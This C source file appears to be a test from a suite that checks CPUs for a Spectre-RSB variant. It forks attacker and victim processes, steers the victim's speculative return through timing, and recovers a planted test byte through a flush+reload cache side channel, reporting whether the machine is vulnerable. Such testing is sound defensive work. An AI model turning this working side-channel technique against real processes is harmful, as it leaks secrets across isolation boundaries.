#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>
#include <pthread.h>
#include <sys/mman.h>
#include <unistd.h>

#include "libcache/cache.h"
#include "lib/global.h"

#define SECRET 'S'

char secret;
pid_t is_child;

void __attribute__((noinline)) in_place()
{
    // We let the child (victim) sleep for a shorter period of time
    // Therefore, the victim should pop the attackers return address from the RSB
    if (is_child)
        usleep(500);
    else
        usleep(50);
    return;
}

void __attribute__((noinline)) attacker()
{
    start_time = time(NULL);
    for (int i = 0; i < MAX_TRY_TIMES; i++)
    {
        in_place();
        // Encode data in cache
        // Victim is supposed to return
        cache_encode(secret);
        if (time(NULL) - start_time > timeout)
        {
            exit(-1);
        }
    }
}

char __attribute__((noinline)) victim()
{
    start_time = time(NULL);
    for (int j = 0; j < MAX_TRY_TIMES; j++)
    {
        // Flush our shared memory
        flush_shared_memory();
        mfence();

        // Put to sleep and return transiently to wrong address before returning here
        in_place();

        // Recover data from the covert channel
        for (int i = 0; i < 256; i++)
        {
            int mix_i = ((i * 167) + 13) & 255;
            if (flush_reload(mem + mix_i * pagesize))
            {
                if (mix_i != '.')
                {
                    return (char)mix_i;
                }
            }
        }
        if (time(NULL) - start_time > timeout)
        {
            printf(ANSI_COLOR_YELLOW "Spectre_RSB_ca_ip: Timeout" ANSI_COLOR_RESET "\n");
            exit(-1);
        }
    }
}

int main(int argc, char **argv)
{
    PREPARE();
    // OOP attack, so fork
    pid_t pid_child = fork();
    is_child = pid_child == 0;

    // Attacker always encodes a dot in the cache
    if (is_child)
    {
        secret = '.';
        attacker();
        exit(1);
    }
    else
    {
        secret = SECRET;
        int exit_result = 0;
        if (victim() == SECRET)
        {
            printf(ANSI_COLOR_RED "Spectre_RSB_ca_ip: Vulnerable" ANSI_COLOR_RESET "\n");
            exit_result = EXIT_SUCCESS;
        }
        else
        {
            printf(ANSI_COLOR_GREEN "Spectre_RSB_ca_ip: Not Vulnerable" ANSI_COLOR_RESET "\n");
            exit_result = EXIT_FAILURE;
        }
        kill(pid_child, SIGKILL);
        exit(exit_result);
    }
}
